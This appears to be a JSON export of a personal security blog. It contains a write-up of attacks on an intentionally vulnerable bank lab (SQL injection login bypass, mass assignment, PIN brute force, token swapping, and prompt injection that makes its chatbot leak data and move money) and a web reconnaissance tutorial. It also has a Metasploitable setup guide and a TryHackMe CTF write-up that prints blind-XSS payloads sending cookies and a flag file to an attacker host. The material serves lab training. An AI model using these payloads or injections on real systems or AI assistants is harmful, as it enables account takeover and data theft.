[{"content":"Introduction Good day fellow hackers, welcome to my blog again. In this writeup i will take you through how i was able to exploit an intentional Vulnerable Bank Application by Ghost St. Badmus, One of the best Application Security Engineers in the industry.\nYou can find the Lab here: Vulnerable Bank Application üè¶ or vulnbank.org\nAuthentication \u0026amp; Authorization Vulnerabilities SQL Injection in login The first thing we will see when we access the application is the Login/Register page,we will try logging in with a simple SQLI payload to see if the application is vulnerable to SQLI. After using \u0026lsquo;or 1=1- - as the username and pass as password,we were logged in as the admin. SQLI payload Mass Assignment Leading Privilege Escalation To exploit this go to the register page and try creating account, intercept the request with your proxy tool(i will be using burpsuite for this task).Forward the request and monitor the response from the server, we noticed a parameter is_admin was set to false in the reponse. Let\u0026rsquo;s set the parameter to true and add it to our account creation request to see if we will get admin privileges. Boom!! it worked, Logged into the account and was presented with the admin panel Mass Assignment Leading To Account Balance Manipulation When creating an ccount, a parameter in the respoonse from the server stood out thus, balance.Let\u0026rsquo;s add this parameter to our account creation request and set the value to any amount of our choice.Login into the account after sending the request and the amount will be reflected. Weak Password Reset Mechanism(3-didgit PIN) The reset password functionality is vulnerable to brute force because it is easy to guess 3-digit pin and also there is no rate limit protection in the apllication.Let\u0026rsquo;s go the reset password endpoint and request for the 3-digit pin. We will be redirected to a page to provide the 3-digit PIN and our new password, intercept the request and send to intruder.Add the payload positon to the reset_pin parameter,payload type to bruteforcer with minimum and maximum length set to three and start the attack. After the attack one of the payload returned with status code 200, meaning that was the pin and the password was changed successfully,This means an attacker can reset users password with just their username. Token Stored in Local Storage Users session tokens are stored locally in the browser, with this anyone who have access to the victim\u0026rsquo;s browser will be able able to view the session token.First, right-click in the page and select inspector or developer tools(depends on the browser you are using), then go to the storage tab, You will see the token stored there. No server-side token invalidation I noticed the server does not validate the tokens sent with the request,with invalid token the server still respond with 200(ok). Transcation Vulnerabilities Negative Amount Transfers Possible For this you need login into your account and go to the Money Transfer endpoint, enter the recipient\u0026rsquo;s account number,negative amount and click on send money.Note that our initial account balance was $2000.0 before sending the money. Now let\u0026rsquo;s check our account balance, you will notice that the negative amount has been added to our account balance. Imagine sending money to someone and your account balance keeps increasing, isn\u0026rsquo;t this fun? No Amount Validation# The application does not validate the amount of money that is beeing sent, you can send no money or simply use 0 as amount to be transferred and it will get sent. Transaction history information disclosure By obtaining a user\u0026rsquo;s account number, an attacker can access their transaction history by navigating to the /transactions endpoint and replacing their own account number with the victim\u0026rsquo;s in the URL. Other Transcation vulnerabilities# There are other transaction vulnerabilities like No validation on recipient accounts and No transaction limits where the application does not validate the recipient\u0026rsquo;s account number,and users can also send any amount of money without any limits.With no transaction limit if an attacker gets access to a victim\u0026rsquo;s account he/she can send all the money in the account at once which isn\u0026rsquo;t ideal.\nClient and Server-Side Flaws Cross Site Scripting(Stored XSS) One way to prove the appliaction is vulnerable to XSS is by making it run javascript code that will generate a popup box if the payload succeeds.To do this i created account with a simple XSS payload as the username,and noticed the script executes the moment we log into the account. Session Management Vulnerabilities# Token Vulnerabilities With ones session token, an attacker can impersonate the user and make transactions without logging into the victim\u0026rsquo;s account. Let\u0026rsquo;s first note the account balance and the session token of the victim. Now login into the attacker\u0026rsquo;s account and go to the /transfer endpoint, intercept the request and swap your token with the victim\u0026rsquo;s token and send the request. Figure 1.1 is the initial request with attacker\u0026rsquo;s token, figure 1.2 is request with victim\u0026rsquo;s token and figure 1.3 is the balance of the victim after the attack. AI/Chatbot hacking The vulnank has been updated with a chatbot that can help you bank easily, you can also ask it questions.We will try some prompt injections to see if we can levearage it to get some information from the application. Here are the images of the prompts i tried to get the application\u0026rsquo;s database and the bot was able to transfer money from a user account with just their account number. These vulnerabilities are the result of my own testing. I\u0026rsquo;m sure there\u0026rsquo;s more to uncover, so feel free to take a look yourself\u0026mdash;you might spot something I missed. I\u0026rsquo;ll be updating this write-up as I find new issues or insights. Happy Hacking :)\n","permalink":"http://localhost:1313/writeups/vulnerable_bank/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eGood day fellow hackers, welcome to my blog again. In this writeup i\nwill take you through how i was able to exploit an intentional\nVulnerable Bank Application by \u003ca href=\"https://x.com/commando_skiipz?t=rPix1FAXa-vFamgkrxjjnQ\u0026amp;s=09\"\u003eGhost St.\nBadmus\u003c/a\u003e,\nOne of the best Application Security Engineers in the industry.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eYou can find the Lab here:\u003c/strong\u003e \u003ca href=\"https://github.com/Commando-X/vuln-bank.git\"\u003eVulnerable Bank Application\nüè¶\u003c/a\u003e or\n\u003ca href=\"http://vulnbank.org\"\u003evulnbank.org\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"authentication--authorization-vulnerabilities\"\u003eAuthentication \u0026amp; Authorization Vulnerabilities\u003c/h2\u003e\n\u003ch3 id=\"sql-injection-in-login\"\u003eSQL Injection in login\u003c/h3\u003e\n\u003cp\u003eThe first thing we will see when we access the application is the\nLogin/Register page,we will try logging in with a simple SQLI payload to\nsee if the application is vulnerable to SQLI. After using \u003cstrong\u003e\u0026lsquo;or 1=1- -\u003c/strong\u003e\nas the username and \u003cstrong\u003epass\u003c/strong\u003e as password,we were logged in as the admin.\n\u003cimg alt=\"Login_page\" loading=\"lazy\" src=\"/images/login_page.png\"\u003e\n\u003ca href=\"/images/sqli.png\"\u003eSQLI payload\u003c/a\u003e\n\u003cimg alt=\"admin acess\" loading=\"lazy\" src=\"/images/admin_access.png\"\u003e\u003c/p\u003e","title":"How I Hacked A Vulnerable Bank Application"},{"content":"Introduction Hello Hackers, Hope you\u0026rsquo;ve grinding hard and ethically? It\u0026rsquo;s been a while, In this writeup i will share some Reconnaissance techniques that will help you to succeed in your bug bounty or Web Application Hacking. As we all know Recon is a crucial stage in hacking, Exploiting a target system is quite easy if you know much about the system and how it works(hence my philosophy 80% recon, 20% exploitation).Enough talking, Let\u0026rsquo;s get our hands dirty!!\nPassive Recon Techniques üß≠ Walking Through a Web Target Manually - Recon Like a Human \u0026ldquo;Before you automate, you observe. Before you exploit, you understand.\u0026rdquo; Manual recon is where real hackers sharpen their instincts.\nManual recon is the art of exploring a target website using your eyes, brain, and browser\u0026mdash;without jumping straight into tools like nmap, ffuf, or Burp Intruder. It helps you understand the site like a real user (and a developer), and often reveals low-hanging bugs that automation can overlook. Before you start running automated tools, Try to uncover every feature in the application that users can access by browsing through every page and clicking every link. Access the functionalities that you don\u0026rsquo;t usually use.\nFor example: if you\u0026rsquo;re hacking Facebook, try to create an event, play a game, and use the payment functionality if you\u0026rsquo;ve never done so before. Sign up for an account at every privilege level to reveal all of the application\u0026rsquo;s features. For example, on Slack, you can create owners, admins, and members of a workspace. Also create users who are members of different channels under the same workspace. This way, you can see what the application looks like to different users. This should give you a rough idea of what the attack surface (all of the different points at which an attacker can attempt to exploit the application) looks like, where the data entry points are, and how different users interact with each other. Then you can start a more in-depth recon process: finding out the technology and structure of an application.\nüåê Whois and Reverse Whois Lookups-Peeking Behind the Domain \u0026ldquo;Every domain has a story \u0026mdash; and WHOIS lets you read the first chapter.\u0026rdquo;\nWHOIS is a protocol used to query domain registration information. It tells you who owns a domain, when it was registered, where it points to, and sometimes reveals admin contact emails, organization names, and related domains \u0026mdash; a goldmine during recon.To query whois information, just simply type\nwhois [Target Site] This information is not always available, as some organizations and individuals use a service called domain privacy, in which a third-party service provider replaces the user\u0026rsquo;s information with that of a forwarding service.You could then conduct a reverse WHOIS search, searching a database by using an organization name, a phone number, or an email address to find domains registered with it. This way, you can find all the domains that belong to the same owner. Reverse WHOIS is extremely useful for finding obscure or internal domains not otherwise disclosed to the public. We can use a public reverse whois tool like ViewDNS.info to conduct this query. üö© Red Flags to Look Out For\nRecently registered domain - Might be used in phishing or shady activity Short TTL or temporary hosting - Signs of suspicious infrastructure Reused email/contact info - Can be tracked across domains Expiring domain - Can become vulnerable or forgotten WHOIS is your first step into the DNS layer of web reconnaissance. It\u0026rsquo;s simple, powerful, and often reveals the invisible strings that tie domains, companies, and infrastructure together.\nüß† DNS Enumeration - Unmasking the Infrastructure \u0026ldquo;Before you can break into the castle, you map its walls, gates, and hidden tunnels \u0026mdash; DNS is that map.\u0026rdquo;\nDNS (Domain Name System) enumeration is the process of collecting DNS records and related infrastructure data about a target. It helps identify: Subdomains, IP addresses,Email servers,Name servers,Load balancers,Misconfigured or forgotten services. First, we need to discover the IP Address of the server by using nslookup. The syntax go like:\nnslookup [Target Site] You can use query for a specific record type by specifying the type option: The record types you can query with nslookup are; Mail Servers(MX), TXT Records(TXT),Canonical Name(CNAME),IPV4 Adrresses(A),IPV6 Addresses(AAAA) etc.\nnslookup -type=Record_type [Target Site] üåç Shodan \u0026amp; Censys - Uncovering Exposed Infrastructure \u0026ldquo;If Google indexes websites, Shodan indexes the internet\u0026rsquo;s devices.\u0026rdquo;\nShodan and Censys are search engines for internet-connected devices and services.They scan and index open ports, services, SSL certs, HTTP banners, metadata, and more,Think of them as a CTO\u0026rsquo;s nightmare and a recon hacker\u0026rsquo;s best friend.They can reveal: Publicly exposed servers/devices (even if subdomains don\u0026rsquo;t exist!), Leaky metadata in HTTP headers or SSL certs,Specific tech stack in use (e.g., Apache Tomcat, Nginx, Jenkins),Misconfigurations or outdated software,IoT devices, security cams, or forgotten test servers etc. To use Shodan, go to shodan.io and type your target server in the search bar. For example: You can add advanced filters like: Other filters:\norg:\u0026ldquo;Company Name\u0026rdquo; \u0026ndash; find all exposed infra owned by a company port:21 \u0026ndash; exposed FTP product:\u0026ldquo;Apache\u0026rdquo; \u0026ndash; find specific tech stack country:\u0026ldquo;US\u0026rdquo; \u0026ndash; filter geographically Censys is similar but focuses more on certificate and IP infrastructure data, To use Censys, go to search.censys.io and type your target name in the search bar like this: Censys also have various filters like: ip \u0026ndash; direct IP search services.http.response.body \u0026ndash; search by response content autonomous_system.name \u0026ndash; scan by ASN üïµÔ∏è‚Äç‚ôÇÔ∏è Google Dorking \u0026ndash; Hacking with Google Search \u0026ldquo;Why break in when Google left the door wide open?\u0026rdquo;\nGoogle Dorking, or Google hacking, is the art of using advanced Google search operators to find sensitive information unintentionally exposed on the internet.It\u0026rsquo;s one of the most underrated yet powerful recon techniques \u0026mdash; you\u0026rsquo;d be surprised what you can uncover with just a browser. Some common google dorks are:\nDork Purpose site:target.com Search only within the target domain intitle:\u0026quot;index of\u0026quot; Discover open directories filetype:pdf site:target.com Find PDFs under the domain inurl:login Login portals and panels ext:log site:target.com Find log files intext:\u0026quot;password\u0026quot; filetype:txt Plaintext password leaks site:pastebin.com \u0026quot;target.com\u0026quot; Info leaks from Pastebin site:github.com \u0026quot;target.com\u0026quot; Sensitive code or API keys on GitHub link:\u0026quot; Specified URL\u0026quot; Pages that contain links to a specified URL You can comnbine two or more dorks depending on the information you want. For Example: To reveal admin panels or dashboards of a target site, you can use: Tips for Effective Dorking\nUse quotes to match exact phrases. Combine multiple operators to narrow results. Search on Google Cache and Wayback Machine for deleted pages. Use public tools like:Exploit-DB Google Hacking DB or Google Dork Search Engine. Active Recon Techniques üåê Subdomain Enumeration \u0026ndash; Discovering the Forgotten Doors \u0026ldquo;The real vulnerabilities often live on subdomains no one remembers.\u0026rdquo;\nSubdomain enumeration is the process of discovering subdomains belonging to a target domain. These subdomains often reveal: Development or staging environments,Forgotten assets, APIs, admin panels, legacy apps,and Third-party integrations (e.g., Shopify, WordPress, Heroku).Finding them expands your attack surface, giving you more opportunities to discover misconfigurations, outdated software, or exposed credentials.(More subdomains = more chances to find bugs).\nTools that can be use for enumerating subdomains are: Sublist3r, SubBrute, Amass, Gobuster etc. Each of these tools employs a different approach to discovering subdomains, so reviewing their manual pages or documentation beforehand is recommended.\nOnce you\u0026rsquo;ve found a good number of subdomains, you can discover more by identifying patterns. For example, if you find two subdomains of target.com named 1.target.com and 3.target.com, you can guess that 2.target.com is probably also a valid subdomain. You can automate this process with a tool called Altdns.\nAnd also if you know about the company\u0026rsquo;s technology stack. For example, if you\u0026rsquo;ve already learned that target.com uses spacelift, you can check if spacelift.target.com is a valid subdomain. Also look for subdomains of subdomains. After you\u0026rsquo;ve found, say, team.target.com, you might find subdomains like 1.team.example.com. You can find subdomains of subdomains by running enumeration tools recursively: add the results of your first run to your Known Domains list and run the tool again.\nüìÅ Directory Brute Forcing - Discovering Hidden Paths \u0026ldquo;Not all doors are locked. Some are just hidden.\u0026rdquo;\nDirectory brute forcing is the process of guessing directories and files on a web server by sending a list of potential paths and observing the responses.It helps uncover:\nAdmin panels (/admin, /manage, etc.) API endpoints (/api/v1/, /graphql) Backup files (.zip, .bak, .old) Hidden pages (/test, /dev, /staging) Sensitive data (.env, .git, config.php) Some popular Tools for Directory Discovery: ffuf, dirsearch, gobuster, feroxbuster, dirb etc. This tools take wordlist and make request and then analyze the response.So using a good/quality wordlist is very important here, i will recommend using wordlist from Seclists or you can also customize your own list.Manually visiting all the pages you\u0026rsquo;ve found through brute-forcing can be time-consuming. Instead, use a screenshot tool like Eyewitness to automatically verify that a page is hosted on each location and also takes screenshots of each page. In a photo gallery app, you can quickly skim these to find the interesting-looking ones. üö© Red Flags to Watch For\nUnprotected panels (/admin, /dashboard) Exposed backups (.zip, .tar, .bak) .git or .svn folders Debug files (debug.log, info.php) Misconfigured APIs or dev endpoints Outdated and Ill-maintaned pages üö™ Port Scanning \u0026amp; Service Enumeration - Finding Open Doors \u0026ldquo;Before you pick the lock, you need to find the door.\u0026rdquo;\nPort scanning is the act of probing a target to discover which network ports are open. Each open port represents a service running on the server, like: SSH(22),FTP(21),HTTP(80),HTTPS(443) etc.Identifying these services is essential for service enumeration, which reveals versions, misconfigurations, and potential vulnerabilities.\nTools that you can use for port scanning: Nmap(with the -sV flag), masscan,rustscan,netcat etc. After determining the services running on the system and the open ports,dive deeper into each service Once ports are open, dive deeper into each service:\nService Tools/Approach HTTP/HTTPS curl, whatweb, nikto, ffuf SSH Check banner, brute-force (with permission) FTP Anonymous login, file listings SMTP VRFY/EXPN, banner grabbing MySQL/PostgreSQL Try default creds, version check SMB enum4linux, smbclient, smbmap üßæ Conclusion Reconnaissance is the foundation of every successful web security assessment. By thoroughly exploring the target\u0026rsquo;s surface from WHOIS data and DNS records to subdomains, directories, ports, and public infrastructure you gather the intel needed to launch precise and effective attacks.\nEach recon technique serves a purpose:\nManual walkthroughs give you the human perspective. WHOIS \u0026amp; DNS lookups reveal ownership and structure. Subdomain \u0026amp; directory brute forcing expose hidden assets. Port scanning \u0026amp; service enumeration uncover the digital services in play. Shodan, Censys, and Google Dorks extend your reach beyond what\u0026rsquo;s visible. In hacking, the best payload is useless if you don\u0026rsquo;t know where to point it, Recon tells you where to aim. Whether you\u0026rsquo;re doing CTFs, bug bounties, or real-world pentests, never skip recon, it often holds the keys to the kingdom.\n","permalink":"http://localhost:1313/writeups/web_recon/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eHello Hackers, Hope you\u0026rsquo;ve grinding hard and ethically? It\u0026rsquo;s been a\nwhile, In this writeup i will share some Reconnaissance techniques that\nwill help you to succeed in your bug bounty or Web Application Hacking.\nAs we all know Recon is a crucial stage in hacking, Exploiting a target\nsystem is quite easy if you know much about the system and how it\nworks(hence my philosophy 80% recon, 20% exploitation).Enough talking,\nLet\u0026rsquo;s get our hands dirty!!\u003c/p\u003e","title":"WebHacking-Recon Techniques"},{"content":"Description A tool written in python that fetches and analyzes the robots.txt file of a website and save the the results to a file for future use.\nUsage[#] python3 /path/to/file Link: https://github.com/kwesilarry1/Robot.txt-Scrapper\nAutomation Scripting ","permalink":"http://localhost:1313/projects/robots_txt_scrapper/","summary":"\u003ch3 id=\"description\"\u003eDescription\u003c/h3\u003e\n\u003cp\u003eA tool written in python that fetches and analyzes the robots.txt file\nof a website and save the the results to a file for future use.\u003c/p\u003e\n\u003ch3 id=\"usage\"\u003eUsage[#]\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epython3 /path/to/file\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"robots.txt\" loading=\"lazy\" src=\"/images/robots.png\"\u003e \u003cstrong\u003eLink:\u003c/strong\u003e\n\u003ca href=\"https://github.com/kwesilarry1/Robot.txt-Scrapper\"\u003ehttps://github.com/kwesilarry1/Robot.txt-Scrapper\u003c/a\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://kwesilarry1.github.io/tags/automation/\"\u003eAutomation\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://kwesilarry1.github.io/tags/scripting/\"\u003eScripting\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","title":"Robots.txt Scrapper Tool"},{"content":"Hey there! it\u0026rsquo;s been a while. In this write-up, I\u0026rsquo;ll be showing you how to set up your own metalsploitable lab for web application security and penetration testing.\nDownloading Metasploitable 2 First, go to google and search for metasploitable 2 and choose the one from sourceforge.net or visit the link provided below: (https://sourceforge.net/projects/metasploitable/). Click on Download and wait for some seconds for the zip file to download automatically.\nSetting Up Extract the ZIP file using your preferred ZIP extractor: Open virtualbox,click on New at the top, Enter: Enter the name of your machine, make sure the \u0026ldquo;Type\u0026rdquo; and \u0026ldquo;Version\u0026rdquo; is the same as the one in the image below.Leave the \u0026ldquo;ISO Image\u0026rdquo; field and click on next: Choose your preferred RAM and CPU size to allocate to the machine and click on next,i will use the default size since metasploitable doesn\u0026rsquo;t require much space and resources. Select \u0026ldquo;Use an Existing Virtual Hard Disk File\u0026rdquo; and click on the folder icon: Click on \u0026ldquo;Add\u0026rdquo;, locate where you extracted the zip file and select \u0026ldquo;Metasploitable.vmdk\u0026rdquo;.Click on Choose and finally next: Now click on \u0026ldquo;Start\u0026rdquo; to boot the machine and wait for some seconds,the default username and password is msfadmin: Type ifconfig to check the machine\u0026rsquo;s IP Address Open your browser, paste the metasploitable ip in the search bar and you should see the list of vulnerable servers been hosted on metasploitable you can get your hands dirty with. I will do writeups on how to hack some of these servers.\nThanks for reading. Happy hacking \u0026lt;3\n","permalink":"http://localhost:1313/writeups/metasploitable/","summary":"\u003cp\u003eHey there! it\u0026rsquo;s been a while. In this write-up, I\u0026rsquo;ll be showing you how\nto set up your own metalsploitable lab for web application security and\npenetration testing.\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 id=\"downloading-metasploitable-2\"\u003eDownloading Metasploitable 2\u003c/h3\u003e\n\u003cp\u003eFirst, go to google and search for metasploitable 2 and choose the one\nfrom \u003cem\u003e\u003cstrong\u003esourceforge.net\u003c/strong\u003e\u003c/em\u003e or visit the link provided below:\n(\u003ca href=\"https://sourceforge.net/projects/metasploitable/)\"\u003ehttps://sourceforge.net/projects/metasploitable/)\u003c/a\u003e. Click on\n\u003cem\u003e\u003cstrong\u003eDownload\u003c/strong\u003e\u003c/em\u003e and wait for some seconds for the zip file to download\nautomatically.\u003c/p\u003e\n\u003ch3 id=\"setting-up\"\u003eSetting Up\u003c/h3\u003e\n\u003cp\u003eExtract the ZIP file using your preferred ZIP extractor:\n\u003cimg alt=\"Extracting\" loading=\"lazy\" src=\"/images/extract.png\"\u003e Open virtualbox,click\non New at the top, Enter: \u003cimg alt=\"new\\nmachine\" loading=\"lazy\" src=\"/images/create.png\"\u003e Enter the name of your\nmachine, make sure the \u0026ldquo;Type\u0026rdquo; and \u0026ldquo;Version\u0026rdquo; is the same as the one in\nthe image below.Leave the \u0026ldquo;ISO Image\u0026rdquo; field and click on next: \u003cimg alt=\"setting\\nup\" loading=\"lazy\" src=\"/images/settings.png\"\u003e Choose your preferred RAM and\nCPU size to allocate to the machine and click on next,i will use the\ndefault size since metasploitable doesn\u0026rsquo;t require much space and\nresources. \u003cimg alt=\"hardware\" loading=\"lazy\" src=\"/images/hardware.png\"\u003e Select \u0026ldquo;Use\nan Existing Virtual Hard Disk File\u0026rdquo; and click on the folder icon:\n\u003cimg alt=\"selecting disk\" loading=\"lazy\" src=\"/images/metasploitable1.png\"\u003e Click on\n\u0026ldquo;Add\u0026rdquo;, locate where you extracted the zip file and select\n\u0026ldquo;Metasploitable.vmdk\u0026rdquo;.Click on Choose and finally next:\n\u003cimg alt=\"VMDK\" loading=\"lazy\" src=\"/images/metasploitable2.png\"\u003e Now click on\n\u0026ldquo;Start\u0026rdquo; to boot the machine and wait for some seconds,the default\nusername and password is \u003cstrong\u003emsfadmin\u003c/strong\u003e:\n\u003cimg alt=\"start\" loading=\"lazy\" src=\"/images/start.png\"\u003e Type \u003cem\u003e\u003cstrong\u003eifconfig\u003c/strong\u003e\u003c/em\u003e to check\nthe machine\u0026rsquo;s IP Address \u003cimg alt=\"ip\" loading=\"lazy\" src=\"/images/ipp.png\"\u003e Open\nyour browser, paste the metasploitable ip in the search bar and you\nshould see the list of vulnerable servers been hosted on metasploitable\nyou can get your hands dirty with.\n\u003cimg alt=\"servers\" loading=\"lazy\" src=\"/images/servers.png\"\u003e I will do writeups on\nhow to hack some of these servers.\u003c/p\u003e","title":"How to set up Metasploitable Lab for Web Hacking"},{"content":" Platform: TryHackMe Link: Stickershop Level: Easy To read the flag in this very simple room, we must take advantage of a Cross-Site Scripting vulnerability.\nScanning Using nmap to scan the target:\nnmap -sV -sC Target_IP -OG The_Sticker_Shop Results Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-30 19:58 GMT Nmap scan report for 10.10.97.238 Host is up (0.17s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 b2:54:8c:e2:d7:67:ab:8f:90:b3:6f:52:c2:73:37:69 (RSA) | 256 14:29:ec:36:95:e5:64:49:39:3f:b4:ec:ca:5f:ee:78 (ECDSA) |_ 256 19:eb:1f:c9:67:92:01:61:0c:14:fe:71:4b:0d:50:40 (ED25519) 8080/tcp open http Werkzeug httpd 3.0.1 (Python 3.8.10) |_http-server-header: Werkzeug/3.0.1 Python/3.8.10 |_http-title: Cat Sticker Shop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.08 seconds we found two open ports; 22(SSH) and 8080(http)\nEnumeration At http://stickershop.thm:8080/ we discover a cat sticker shop website. Clicking on the Feedback leads to http://stickershop.thm:8080/submit_feedback, a section for customer feedback. Tried to submit some feedback to see how the server treats the the comments and discovered the feedback is reviewed manually, likely in a staff browser or a vulnerable environment. XSS Exploitation to Obtain the flag This feedback form could be vulnerable to Cross Site Scripting specfically Blind.Let\u0026rsquo;s start with a test to confirm the avialability of XSS.We start our Netcat Listener and send the payload at http://stickershop.thm:8080/submit_feedback.\n\u0026lt;script\u0026gt;document.location=\u0026#39;http://Attacker_IP:8080/?cookie=\u0026#39;+document.cookie;\u0026lt;/script\u0026gt; After submitting the payload we get some responses on our web server, confirming the XSS vulnerability. We already know that the flag is at http://10.10.139.96:8080/flag.txt, so we can use a modified payload in order to receive it on our listener.\n\u0026#39;\u0026#34;\u0026gt;\u0026lt;script\u0026gt; fetch(\u0026#39;http://127.0.0.1:8080/flag.txt\u0026#39;) .then(response =\u0026gt; response.text()) .then(data =\u0026gt; { fetch(\u0026#39;http://Attacker_IP:994/?flag=\u0026#39; + encodeURIComponent(data)); }); \u0026lt;/script\u0026gt; XSS Payload Explanation The payload starts with \u0026ldquo;\u0026gt; to break out of an HTML attribute or tag, injecting malicious JavaScript into the webpage. The tag wraps the JavaScript code, enabling it to execute when the injected content is rendered by the victim\u0026rsquo;s browser. The fetch function sends a request to http://127.0.0.1:8080/flag.txt from the victim\u0026rsquo;s browser.If the victim\u0026rsquo;s browser has access to this local server, it will fetch the contents of flag.txt .then(response=\u0026gt;response.text()) onverts the response (presumably text data) into a readable format. The script constructs a URL containing the extracted data and sends it to the attacker\u0026rsquo;s server (specified by \u0026lt;-IP-Address\u0026gt;:994) encodeURIComponent(data) ensures that special characters in the data are properly escaped, making the URL valid THANK YOU :D\n","permalink":"http://localhost:1313/writeups/thm_sticker_shop/","summary":"\u003cul\u003e\n\u003cli\u003ePlatform: TryHackMe\u003c/li\u003e\n\u003cli\u003eLink: \u003ca href=\"https://tryhackme.com/room/thestickershop\"\u003eStickershop\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eLevel: Easy\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003cp\u003eTo read the flag in this very simple room, we must take advantage of a\nCross-Site Scripting vulnerability.\u003c/p\u003e\n\u003chr\u003e\n\u003ch3 id=\"scanning\"\u003eScanning\u003c/h3\u003e\n\u003cp\u003eUsing \u003ccode\u003enmap\u003c/code\u003e to scan the target:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -sV -sC Target_IP -OG The_Sticker_Shop\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"results\"\u003eResults\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eStarting Nmap 7.95 ( https://nmap.org ) at 2025-03-30 19:58 GMT\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNmap scan report for 10.10.97.238\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eHost is up (0.17s latency).\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNot shown: 998 closed tcp ports (reset)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePORT     STATE SERVICE VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e| ssh-hostkey: \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e|   3072 b2:54:8c:e2:d7:67:ab:8f:90:b3:6f:52:c2:73:37:69 (RSA)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e|   256 14:29:ec:36:95:e5:64:49:39:3f:b4:ec:ca:5f:ee:78 (ECDSA)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e|_  256 19:eb:1f:c9:67:92:01:61:0c:14:fe:71:4b:0d:50:40 (ED25519)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e8080/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.8.10)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e|_http-server-header: Werkzeug/3.0.1 Python/3.8.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e|_http-title: Cat Sticker Shop\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNmap done: 1 IP address (1 host up) scanned in 17.08 seconds\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003ewe found two open ports; 22(SSH) and 8080(http)\u003c/p\u003e","title":"THM: Stickershop CTF"},{"content":"‚ùìIntroduction Hii, I\u0026rsquo;m Appiah Bismark ‚ÄúAlso known online as Kwesi Larry(0kxwizard),an Application Security Tester and Bug Hunter with experience in scripting, networking and linux administration. I Love breaking things (ethically), and sharing my knowledge, I love learning and mostly use my leisure time to do OSINT and Forensics Investigations and sometimes play chess.\nüí° Skills Penetration Testing: OWASP Top 10, Web Application Testing,Wireless Network Testing. Programming: Python, Bash scripting. Investigations: OSINT Investigations, Forensics Investigations. Security Auditing: Vulnerability Assessment and Penetration Testing, Report writing, Code Reviews,Bug Hunting. Miscellaneous: Docker, Git, Markdown. Tools: Metasploit, Burpsuite, OWASP Zap, NMAP,Wireshark,Nessuss. üèÖ Achievements and Certifications -TryHackMe Junior Penetration Tester certificate here\nüéì Education Senior High School: Opoku Ware School Course: GeneralArts(2020-2023) University: University of Mines and Technology Course: Bsc.Cybersecurity(2025-2028) Work Experience 